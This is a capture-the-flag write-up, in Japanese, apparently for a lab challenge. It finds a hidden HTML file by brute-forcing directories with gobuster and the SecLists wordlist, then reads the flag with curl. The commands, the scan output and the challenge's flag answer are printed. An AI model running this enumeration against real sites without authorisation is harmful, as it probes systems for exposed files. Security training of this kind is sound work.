# Discovery 10

ゲーム会社に勤めているジョナサンが管理しているサイト( http://10.10.10.6/Wg6LQhmX/ ) 配下のディレクトリに、機密情報(flag)が記載されたテスト用の html ファイルが公開されていると連絡を受けました。 ジョナサンはサイトにあるリンクたどって該当ファイルを見つけ出そうとしましたが、うまくいきませんでした。 攻撃者はどのようにして機密情報(flag)を見つけだしたのでしょうか? あなたは機密情報(flag)を見つけ出し記載されたフラグを確認してください。

## log

```bash
nix-shell -p gobuster
git clone --depth 1 https://github.com/danielmiessler/SecLists.git
gobuster dir -u http://10.10.10.6/Wg6LQhmX/ -w SecLists/Discovery/Web-Content/common.txt
```

```
[nix-shell:~/repo/github.com/diohabara/picopico/scripts/vlc-2023]$ gobuster dir -u http://10.10.10.6/Wg6LQhmX/ -w SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.6/Wg6LQhmX/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/08/05 21:48:18 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 199]
/.htaccess            (Status: 403) [Size: 199]
/.hta                 (Status: 403) [Size: 199]
/games                (Status: 301) [Size: 241] [--> http://10.10.10.6/Wg6LQhmX/games/]
Progress: 4715 / 4716 (99.98%)
===============================================================
```

```
nix-shell:~/repo/github.com/diohabara/picopico/scripts/vlc-2023]$ gobuster dir -u http://10.10.10.6/Wg6LQhmX/games/ -w SecLists/Discovery/Web-Content/common.txt -x html
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.6/Wg6LQhmX/games/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              html
[+] Timeout:                 10s
===============================================================
2023/08/05 21:57:33 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 199]
/.htaccess.html       (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/.htpasswd.html       (Status: 403) [Size: 199]
/.hta.html            (Status: 403) [Size: 199]
/.htaccess            (Status: 403) [Size: 199]
/admin.html           (Status: 200) [Size: 19]
Progress: 9429 / 9432 (99.97%)
===============================================================
2023/08/05 22:02:21 Finished
===============================================================
```

```
$ curl http://10.10.10.6/Wg6LQhmX/games/admin.html

flag{L1h$ZL-!-,es}
```